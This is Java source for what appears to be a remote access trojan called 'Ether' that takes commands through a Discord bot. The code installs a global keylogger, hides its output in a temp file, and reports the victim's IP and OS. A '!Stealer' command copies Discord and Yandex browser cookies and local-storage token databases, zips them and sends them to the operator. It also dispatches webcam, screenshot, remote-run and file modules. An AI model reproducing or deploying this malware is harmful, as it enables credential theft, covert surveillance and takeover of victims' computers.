package me.Eclipse;

import me.Eclipse.Modules.Impl.Admin.UpdateModule;
import me.Eclipse.Modules.Impl.*;
import me.Eclipse.Modules.Start;
import me.Eclipse.Utils.FileData;
import me.Eclipse.Utils.Helper;
import me.Eclipse.Utils.Timer;
import net.dv8tion.jda.api.AccountType;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.utils.AttachmentOption;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import javax.security.auth.login.LoginException;
import java.awt.*;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.nio.file.Files;
import java.util.Objects;

public class Brain extends ListenerAdapter {
    private static String Build;
    private static File CookiesDiscord;
    private static File CookiesYandex;
    public static String Data;
    private static boolean DeveloperMode;
    private static File EtherCookiesDiscord;
    private static File EtherCookiesYandex;
    public static boolean Failed;
    private static String Key;
    private static int KeyCounter;
    private static File LevelDBDiscord;
    private static File LevelDBYandex;
    private static File LocalStorageDiscord;
    private static File LocalStorageYandex;
    private static boolean Logged;
    public static int Minutes;
    private static File StealedDiscord;
    private static File StealedYandex;
    public static boolean TaskMGRMode;
    public static String Username = FileData.Username.substring(0, 3).toUpperCase() + (int) (Math.random() * 100.0D) + (int) (Math.random() * 100.0D);
    public static String Version;

    static {
        Version = "6.0";
        Key = "Reborn";
        Build = "Default";
        CookiesDiscord = new File("C:\\Users\\" + Username + "\\AppData\\Roaming\\Discord\\Cookies");
        EtherCookiesDiscord = new File("C:\\Users\\" + Username + "\\AppData\\Local\\Ether\\CookiesDiscord");
        LocalStorageDiscord = new File("C:\\Users\\" + Username + "\\AppData\\Roaming\\Discord\\Local Storage");
        LevelDBDiscord = new File("C:\\Users\\" + Username + "\\AppData\\Local\\Ether\\leveldbDiscord");
        StealedDiscord = new File("C:\\Users\\" + Username + "\\AppData\\Local\\Ether\\StealedDiscord.zip");
        CookiesYandex = new File("C:\\Users\\" + Username + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies");
        EtherCookiesYandex = new File("C:\\Users\\" + Username + "\\AppData\\Local\\Ether\\CookiesYandex");
        LocalStorageYandex = new File("C:\\Users\\" + Username + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage");
        LevelDBYandex = new File("C:\\Users\\" + Username + "\\AppData\\Local\\Ether\\leveldbYandex");
        StealedYandex = new File("C:\\Users\\" + Username + "\\AppData\\Local\\Ether\\StealedYandex.zip");
    }

    public static void main(String[] var0) throws IOException, LoginException {
        System.out.println("[ETHER V" + Version + "] Developed by Eclipse.");
        PrintStream var1 = new PrintStream(new FileOutputStream("C:\\Users\\" + FileData.Username + "\\AppData\\Local\\Temp\\CrashLogs"));
        System.setErr(var1);
        System.setOut(var1);
        (new JDABuilder(AccountType.BOT)).setToken("NTk3MDc4MTg5OTM1ODIwODEz.XSC2ag.Ykk657qnc8bebLvYwE0fxsaIeEc").build().addEventListener(new Object[]{new Brain()});
        Start.loadPreferences();
        KeyLoggerModule.init();

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException var3) {
            Failed = true;
        }

        GlobalScreen.addNativeKeyListener(new KeyLoggerModule());

        while (true) {
            Start.whileCircle();
        }
    }

    public void onMessageReceived(MessageReceivedEvent var1) {
        Message var2 = var1.getMessage();
        Guild var3 = var1.getGuild();
        if (var3.getId().equals("597020642935701525") && !var2.getAuthor().isBot()) {
            if (!Logged) {
                try {
                    Helper.sendChannelMessage(Color.CYAN, FileData.Username + " v" + Version + " (" + Build + ")", "OS: " + (System.getProperty("os.name").toLowerCase().contains("win") ? "Windows " + System.getProperty("os.version") : "Unknown") + "\nIP: " + Helper.getIP() + "\nID: " + Username + "\n(" + System.getProperty("java.vm.name") + ")", "615284431334146058", var1);
                } catch (IOException var14) {
                    Helper.sendChannelMessage(Color.CYAN, FileData.Username + " v" + Version + " (" + Build + ")", "OS: " + (System.getProperty("os.name").toLowerCase().contains("win") ? "Windows " + System.getProperty("os.version") : "Unknown") + "\nID: " + Username + "\n(" + System.getProperty("java.vm.name") + ")", "615284431334146058", var1);
                }

                Logged = true;
            }

            if (var2.getChannel().getName().contains("verification")) {
                if (var2.getContentDisplay().equals(Key) && KeyCounter <= 5) {
                    var3.addRoleToMember((Member) Objects.requireNonNull(var1.getMember()), (Role) Objects.requireNonNull(var3.getRoleById("597026989844725800"))).complete();
                    var2.delete().complete();
                    KeyCounter = 0;
                } else {
                    var2.delete().complete();
                    ++KeyCounter;
                }
            }

            if (var2.getChannel().getName().contains("keys")) {
                if (var2.getContentDisplay().equalsIgnoreCase("!Keys") || var2.getContentDisplay().equalsIgnoreCase("!Key")) {
                    Helper.sendMessage(Color.CYAN, Username, "Key: " + Key + ".", var1);
                }

                var2.delete().complete();
            }

            if (var2.getChannel().getName().contains("commands")) {
                if (var2.getContentDisplay().equalsIgnoreCase("!Online")) {
                    Helper.sendMessage(Color.CYAN, FileData.Username + " (" + Data + ")", "UpTime: " + Minutes + "min. Version: " + Version + ".\nID: " + Username + ".", var1);
                }

                if ((var2.getContentDisplay().equalsIgnoreCase("!Permissions " + Username) || var2.getContentDisplay().equalsIgnoreCase("!Permissions @ALL")) && Start.Perms.length() <= 1500) {
                    Helper.sendMessage(Color.CYAN, FileData.Username + " (v" + Version + ")", Start.Perms, var1);
                }
            }

            if (!DeveloperMode || var2.getAuthor().getId().equalsIgnoreCase("403826722040184832")) {
                if (Start.Perms.isEmpty() || Start.Perms.contains("@ALL") || Start.Perms.contains(var2.getAuthor().getId()) || var2.getAuthor().getId().equalsIgnoreCase("403826722040184832")) {
                    if (var2.getChannel().getName().contains("commands") && (var2.getContentDisplay().equalsIgnoreCase("!Disconnect " + Username + " " + Version) || var2.getContentDisplay().equalsIgnoreCase("!Disconnect @ALL " + Version))) {
                        Helper.sendMessage(Color.CYAN, Username + " v" + Version, "The user has been disconnected.", var1);
                        if (Timer.delay(2500.0F)) {
                            System.exit(-1);
                        }
                    }

                    if (var2.getChannel().getName().contains("commands") && (var2.getContentDisplay().equalsIgnoreCase("!DeveloperMode " + Username) || var2.getContentDisplay().equalsIgnoreCase("!DeveloperMode @ALL")) && var2.getAuthor().getId().equalsIgnoreCase("403826722040184832")) {
                        DeveloperMode = !DeveloperMode;
                        Helper.sendMessage(Color.CYAN, Username, "DeveloperMode has been set to: " + DeveloperMode + ".", var1);
                    }

                    if (var2.getChannel().getName().contains("commands") && (var2.getContentDisplay().equalsIgnoreCase("!TaskMGRMode " + Username) || var2.getContentDisplay().equalsIgnoreCase("!TaskMGRMode @ALL"))) {
                        TaskMGRMode = !TaskMGRMode;
                        Helper.sendMessage(Color.CYAN, Username, "TaskMGRMode has been set to: " + TaskMGRMode + ".", var1);
                    }

                    if (TaskMGRMode) {
                        try {
                            if (Helper.checkProcess("taskmgr.exe")) {
                                return;
                            }
                        } catch (IOException var11) {
                            ;
                        }
                    }

                    if (var3.getMembersWithRoles(new Role[]{var3.getRoleById("597082292195950604")}).contains(var2.getMember()) && var2.getChannel().getName().contains("commands") && (var2.getContentDisplay().equalsIgnoreCase("!Stealer " + Username) || var2.getContentDisplay().equalsIgnoreCase("!Stealer @ALL"))) {
                        if (CookiesDiscord.exists()) {
                            try {
                                if (EtherCookiesDiscord.exists()) {
                                    EtherCookiesDiscord.delete();
                                }

                                Files.copy(CookiesDiscord.toPath(), EtherCookiesDiscord.toPath());
                                Helper.sendPrivateMessage(Color.GREEN, "Discord: " + Username, "", var1);
                                var2.getAuthor().openPrivateChannel().queue((var0) -> {
                                    var0.sendFile(EtherCookiesDiscord, new AttachmentOption[0]).queue();
                                });
                            } catch (IOException var10) {
                                Helper.sendPrivateMessage(Color.RED, "Discord: " + Username, "Error while copying Cookies.", var1);
                            }
                        }

                        File[] var16;
                        File var17;
                        String[] var4;
                        String[] var5;
                        int var6;
                        int var7;
                        String var8;
                        File[] var15;
                        if (LocalStorageDiscord.exists()) {
                            try {
                                if (!LevelDBDiscord.exists()) {
                                    LevelDBDiscord.mkdir();
                                } else {
                                    var4 = LevelDBDiscord.list();
                                    assert var4 != null;

                                    var5 = var4;
                                    var6 = var4.length;

                                    for (var7 = 0; var7 < var6; ++var7) {
                                        var8 = var5[var7];
                                        (new File(LevelDBDiscord, var8)).delete();
                                    }
                                }

                                var15 = (new File(LocalStorageDiscord.toString() + "\\leveldb")).listFiles();
                                assert var15 != null;

                                var16 = var15;
                                var6 = var15.length;

                                for (var7 = 0; var7 < var6; ++var7) {
                                    var17 = var16[var7];
                                    Files.copy(var17.toPath(), (new File(LevelDBDiscord.toString() + File.separator + var17.getName())).toPath());
                                }

                                Helper.toZip(LevelDBDiscord.toString(), StealedDiscord.toString());
                                var2.getAuthor().openPrivateChannel().queue((var0) -> {
                                    var0.sendFile(StealedDiscord, new AttachmentOption[0]).queue();
                                });
                            } catch (IOException var13) {
                                Helper.sendPrivateMessage(Color.RED, "Discord: " + Username, "Error while creating Zip file.", var1);
                            }
                        }

                        if (CookiesYandex.exists()) {
                            try {
                                if (EtherCookiesYandex.exists()) {
                                    EtherCookiesYandex.delete();
                                }

                                Files.copy(CookiesYandex.toPath(), EtherCookiesYandex.toPath());
                                Helper.sendPrivateMessage(Color.GREEN, "Yandex: " + Username, "", var1);
                                var2.getAuthor().openPrivateChannel().queue((var0) -> {
                                    var0.sendFile(EtherCookiesYandex, new AttachmentOption[0]).queue();
                                });
                            } catch (IOException var9) {
                                Helper.sendPrivateMessage(Color.RED, "Yandex: " + Username, "Error while copying Cookies.", var1);
                            }
                        }

                        if (LocalStorageYandex.exists()) {
                            try {
                                if (!LevelDBYandex.exists()) {
                                    LevelDBYandex.mkdir();
                                } else {
                                    var4 = LevelDBYandex.list();
                                    assert var4 != null;

                                    var5 = var4;
                                    var6 = var4.length;

                                    for (var7 = 0; var7 < var6; ++var7) {
                                        var8 = var5[var7];
                                        (new File(LevelDBYandex, var8)).delete();
                                    }
                                }

                                var15 = (new File(LocalStorageYandex.toString() + "\\leveldb")).listFiles();
                                assert var15 != null;

                                var16 = var15;
                                var6 = var15.length;

                                for (var7 = 0; var7 < var6; ++var7) {
                                    var17 = var16[var7];
                                    Files.copy(var17.toPath(), (new File(LevelDBYandex.toString() + File.separator + var17.getName())).toPath());
                                }

                                Helper.toZip(LevelDBYandex.toString(), StealedYandex.toString());
                                var2.getAuthor().openPrivateChannel().queue((var0) -> {
                                    var0.sendFile(StealedYandex, new AttachmentOption[0]).queue();
                                });
                            } catch (IOException var12) {
                                Helper.sendPrivateMessage(Color.RED, "Yandex: " + Username, "Error while creating Zip file.", var1);
                            }
                        }

                        Helper.sendMessage(Color.GREEN, Username, "Done!", var1);
                    }

                    this.runModules(var1);
                }
            }
        }
    }

    private void runModules(MessageReceivedEvent var1) {
        ConsoleModule.run(var1);
        CameraModule.run(var1);
        ScreenModule.run(var1);
        ListModule.run(var1);
        DownloadModule.run(var1);
        RunModule.run(var1);
        DeleteModule.run(var1);
        ReadModule.run(var1);
        CopyModule.run(var1);
        CreateModule.run(var1);
        WallpaperModule.run(var1);
        MessageModule.run(var1);
        KeyLoggerModule.run(var1);
        UpdateModule.run(var1);
    }
}
